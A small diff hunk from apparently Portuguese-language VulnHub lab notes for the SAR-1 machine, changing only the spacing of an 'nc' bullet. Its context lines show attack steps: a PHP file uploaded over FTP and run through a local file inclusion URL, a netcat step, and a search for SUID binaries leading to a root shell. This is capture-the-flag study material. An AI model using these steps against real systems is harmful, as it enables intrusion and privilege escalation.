@@ -1037,7 +1037,7 @@ Desafio 23 - - https://www.vulnhub.com/entry/sar-1,425/ </br>
 			ftp: put beco22.php
 				browser: http://192.168.100.28/secret_information/?lang=/var/ftp/pub/beco22.php
 				
-		*nc
+		* nc
 			find / -perm -u=s -type f 2>&-
 						#/home/tom/rootshell
 						cd /home/tom
